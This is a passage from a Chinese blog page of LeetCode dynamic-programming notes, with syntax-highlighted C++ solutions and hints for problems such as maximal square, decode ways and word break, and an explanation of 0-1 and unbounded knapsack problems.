<span class="number">0</span>) dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i - <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (j &gt; <span class="number">0</span>) dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> dp[i][j] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &lt; m - <span class="number">1</span>) dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i + <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (j &lt; n - <span class="number">1</span>) dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][j + <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要左上到右下，右下到左上各扫一遍。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/maximal-square">最大正方形</a><br>在一个由’0’和’1’组成的二维矩阵内，找到只包含’1’的最大正方形，并返回其面积。<br><img src="https://assets.leetcode.com/uploads/2020/11/26/max1grid.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> maxSide = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>(), n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i - <span class="number">1</span>][j - <span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> minNum = <span class="built_in">min</span>(&#123;dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>], dp[i - <span class="number">1</span>][j - <span class="number">1</span>]&#125;);</span><br><span class="line">                    dp[i][j] = minNum + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                maxSide = <span class="built_in">max</span>(maxSide, dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxSide * maxSide;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：在右下角记录正方形的最大边，状态转移方程为dp[i][j]&#x3D;1+min({dp[i-1][j-1], dp[i-1][j], dp[i][j-1]})。</p></li></ul><h2 id="三、分割问题"><a href="#三、分割问题" class="headerlink" title="三、分割问题"></a>三、分割问题</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/perfect-squares?source=vscode">完全平方数</a><br>给你一个整数n，返回和为n的完全平方数的最少数量。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numSquares</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> minNum = <span class="number">10001</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j * j &lt;= i; ++j) &#123;</span><br><span class="line">                minNum = <span class="built_in">min</span>(minNum, dp[i - j * j]);</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = minNum + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：位置只依赖于i-j^2，因为这样才符合完全平方数分割。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/decode-ways?source=vscode">解码方法</a><br>已知字母 A-Z 可以表示成数字 1-26。给定一个数字串，求有多少种不同的字符串等价于这个数字串。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numDecodings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (s[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span> || s[<span class="number">0</span>] == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s[<span class="number">1</span>] &lt;= <span class="string">&#x27;6&#x27;</span>) ++dp[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (s[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>) dp[<span class="number">1</span>]--;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i - <span class="number">1</span>] &gt; <span class="string">&#x27;2&#x27;</span> || s[i - <span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span> dp[i] = dp[i - <span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i - <span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span> || s[i - <span class="number">1</span>] == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">                    dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">                <span class="keyword">else</span>  dp[i] = dp[i - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意状态转移方程不止一种。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/word-break?source=vscode">单词拆分</a><br>给你一个字符串s和一个字符串列表wordDict作为字典。如果可以利用字典中出现的一个或多个单词(可以重复使用)拼接出s则返回true。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">dp</span><span class="params">(size + <span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= size; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">const</span> string&amp; word : wordDict) &#123;</span><br><span class="line">                <span class="type">int</span> length = word.<span class="built_in">length</span>();</span><br><span class="line">                <span class="keyword">if</span> (i &gt;= length &amp;&amp; s.<span class="built_in">substr</span>(i - length, length) == word) </span><br><span class="line">                    dp[i] = dp[i - length];</span><br><span class="line">                <span class="keyword">if</span> (dp[i]) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[size];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：和完全平方数差不多，位置只依赖于i-word.length。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/filling-bookcase-shelves?source=vscode">填充书架</a><br>给定一个数组，每个元素代表一本书的厚度和高度。问对于一个固定宽度的书架，如果按照数组中书的顺序从左到右、从上到下摆放，最小总高度是多少。<br><img src="https://assets.leetcode.com/uploads/2019/06/24/shelves.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minHeightShelves</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; books, <span class="type">int</span> shelfWidth)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = books.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> w = books[i - <span class="number">1</span>][<span class="number">0</span>], h = books[i - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>] + h;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i - <span class="number">1</span>; j &gt; <span class="number">0</span>; --j) &#123;</span><br><span class="line">                <span class="type">int</span> prevW = books[j - <span class="number">1</span>][<span class="number">0</span>], prevH = books[j - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">                w += prevW;</span><br><span class="line">                <span class="keyword">if</span> (w &gt; shelfWidth) <span class="keyword">break</span>;</span><br><span class="line">                h = <span class="built_in">max</span>(prevH, h);</span><br><span class="line">                dp[i] = <span class="built_in">min</span>(dp[i], h + dp[j - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：摆放只有两种情况，摆在前一本书后面或者直接摆在下一层。</p></li><li><p>题目五：<a href="https://leetcode.cn/problems/combination-sum-iv?source=vscode">组合总和 Ⅳ</a><br>给定一个不重复数字的数组和一个目标数，求加起来是目标数的所有排列的总数量。(虽然这道题叫做Combination Sum，但是不同顺序的组合会被当作不同答案，因此本质上是排列)</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">combinationSum4</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(target + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= target; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">                <span class="keyword">if</span> (num &lt;= i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (dp[i] &gt; __INT_MAX__ - dp[i - num]) <span class="keyword">break</span>;</span><br><span class="line">                    dp[i] += dp[i - num];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：和完全平方数也是差不多的，这里为了全用int来完成时间上会稍稍多一点，可以换成double类型去掉多的if判断。</p></li></ul><h2 id="四、子序列问题"><a href="#四、子序列问题" class="headerlink" title="四、子序列问题"></a>四、子序列问题</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/longest-increasing-subsequence">最长递增子序列</a><br>给你一个整数数组nums，找到其中最长严格递增子序列的长度。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> maxTemp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] &gt; nums[j])</span><br><span class="line">                    maxTemp = <span class="built_in">max</span>(maxTemp, dp[j]);</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = maxTemp + <span class="number">1</span>;</span><br><span class="line">            res = <span class="built_in">max</span>(dp[i], res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：这道题很简单，但是动态规划并不是最优解。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/longest-common-subsequence">最长公共子序列</a><br>给定两个字符串text1和text2，返回这两个字符串的最长公共子序列的长度。如果不存在公共子序列，返回0。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(string text1, string text2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len1 = text<span class="number">1.l</span>ength();</span><br><span class="line">        <span class="type">int</span> len2 = text<span class="number">2.l</span>ength();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(len1 + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(len2 + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len1; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= len2; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (text1[i - <span class="number">1</span>] == text2[j - <span class="number">1</span>])</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i][j - <span class="number">1</span>], dp[i - <span class="number">1</span>][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[len1][len2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用二维dp来记录，dp[i][j]记录的是text1.length&lt;&#x3D;1，text2.length&lt;&#x3D;j时最大的公共子长度。</p></li></ul><h2 id="五、背包问题"><a href="#五、背包问题" class="headerlink" title="五、背包问题"></a>五、背包问题</h2><ul><li><p>算法解释：背包问题(knapsack problem)是一种组合优化的NP完全问题：有n个物品和载重为w的背包，每个物品都有自己的重量weight和价值value，求拿哪些物品可以使得背包所装下物品的总价值最大。如果限定每种物品只能选择0个或1个，则问题称为<strong>0-1背包问题(0-1 knapsack)</strong>；如果不限定每种物品的数量，则问题称为<strong>无界背包问题或完全背包问题(unbounded knapsack)</strong>。我们可以用动态规划来解决背包问题。以0-1背包问题为例。</p></li><li><p>0-1背包问题：</p><ul><li>分析：我们可以定义一个二维数组dp存储最大价值，其中dp[i][j]表示前i件物品重量不超过j的情况下能达到的最大价值。在我们遍历到第i件物品时，在当前背包总载重为j的情况下，如果我们不将物品i放入背包，那么dp[i][j]&#x3D;dp[i-1][j]，即前i个物品的最大价值等于只取前i-1个物品时的最大价值；如果我们将物品i放入背包，假设第i件物品重量为weight，价值为value，那么我们得到dp[i][j]&#x3D;dp[i-1][j-weight]+value。我们只需在遍历过程中对这两种情况取最大值即可，总时间复杂度和空间复杂度都为O(nw)。</li><li>状态转移矩阵示例：<br><img src="https://noworneverev.github.io/leetcode_101/assets/images/6.3-c71586b9976f87e73a4366dab403bfe6.png" alt="示例"></li><li>代码：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> n, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(w + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> weight = weights[i - <span class="number">1</span>], value = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= w; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= weight) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - weight] + value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][w];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>代码2(空间复杂度为O(w))：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> n, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(w + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> weight = weights[i - <span class="number">1</span>], value = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = w; j &gt;= weight; --j) &#123;</span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j - weight] + value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[w];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>无界背包问题</p><ul><li>分析：在完全背包问题中，一个物品可以拿多次。如图上半部分所示，假设我们遍历到物品i&#x3D;2，且其重量为weight&#x3D;2，价值为value&#x3D;3；对于背包载重j&#x3D;5，最多只能装下2个该物品。那么我们的状态转移方程就变成了dp[2][5]&#x3D;max(dp[1][5], dp[1][3]+3, dp[1][1]+6)。如果采用这种方法，假设背包载重无穷大而物体的重量无穷小，我们这里的比较次数也会趋近于无穷大，远超O(nw)的时间复杂度。怎么解决这个问题呢？我们发现在dp[2][3]的时候我们其实已经考虑了dp[1][3]和dp[2][1]的情况，而在时dp[2][1]也已经考虑了dp[1][1]的情况。因此，如图下半部分所示，对于拿多个物品的情况，我们只需考虑dp[2][3]即可，即dp[2][5]&#x3D;max(dp[1][5], dp[2][3]+3)。这样，我们就得到了完全背包问题的状态转移方程：dp[i][j]&#x3D;max(dp[i-1][j], dp[i][j-w]+v)，其与0-1背包问题的差别仅仅是把状态转移方程中的第二个i-1变成了i。</li><li>状态转移矩阵示例：<br><img src="https://noworneverev.github.io/leetcode_101/assets/images/6.4-0db4e8ce37dca2dd4fae73b98a7ff67a.png" alt="示例"></li><li>代码：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> n, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(w + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> weight = weights[i - <span class="number">1</span>], value = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= w; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= weight) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i][j - weight] + value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][w];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>代码2(空间复杂度为O(w))：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> n, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(w + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> weight = weights[i - <span class="number">1</span>], value = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = weight; j &lt;= w; ++j) &#123;</span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j - weight] + value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 